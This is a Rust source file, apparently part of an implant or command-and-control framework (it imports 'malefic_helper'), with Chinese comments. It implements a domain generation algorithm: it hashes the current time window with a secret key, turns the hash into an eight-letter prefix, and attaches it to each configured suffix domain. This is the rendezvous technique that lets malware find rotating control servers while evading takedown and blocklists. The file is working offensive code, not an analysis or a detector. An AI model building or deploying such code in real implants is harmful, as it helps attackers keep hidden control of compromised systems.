use super::{TimeWindow, DgaDomain};
use sha2::{Sha256, Digest};
use malefic_helper::debug;
/// DGA算法实现
#[derive(Debug)]
pub struct DgaAlgorithm {
    key: String,
    interval_hours: u32,
    domains: Vec<String>,
}

impl DgaAlgorithm {
    pub fn new(key: String, interval_hours: u32, domains: Vec<String>) -> Self {
        Self {
            key,
            interval_hours,
            domains,
        }
    }

    fn encode(&self, seed: String) -> String {
        let mut hasher = Sha256::new();
        hasher.update(seed.as_bytes());
        let hash = hasher.finalize();

        let mut prefix = String::new();
        let alphabet = b"abcdefghijklmnopqrstuvwxyz";

        // 使用hash的前8个字节生成8位字母前缀
        for i in 0..8.min(hash.len()) {
            let index = (hash[i] as usize) % alphabet.len();
            prefix.push(alphabet[index] as char);
        }

        prefix
    }
    
    /// 为指定时间窗口生成所有可能的域名
    pub fn generate(&self) -> Vec<DgaDomain> {
        let current_window = TimeWindow::current(self.interval_hours);
        let seed = format!("{}{}", current_window.to_seed_string(), self.key);
        debug!("[debug] Seed_DgaKey: '{}'", seed);

        let prefix = self.encode(seed.clone());

        let mut domains = Vec::new();
        
        for suffix in &self.domains {
            let domain = format!("{}.{}", prefix, suffix);
            domains.push(DgaDomain {
                domain,
                seed: seed.clone(),
                prefix: prefix.clone(),
                suffix: suffix.clone(),
            });
        }

        debug!("[dga] Generated {} domains for current time window: {}",
               domains.len(), current_window.to_seed_string());
        domains
    }

}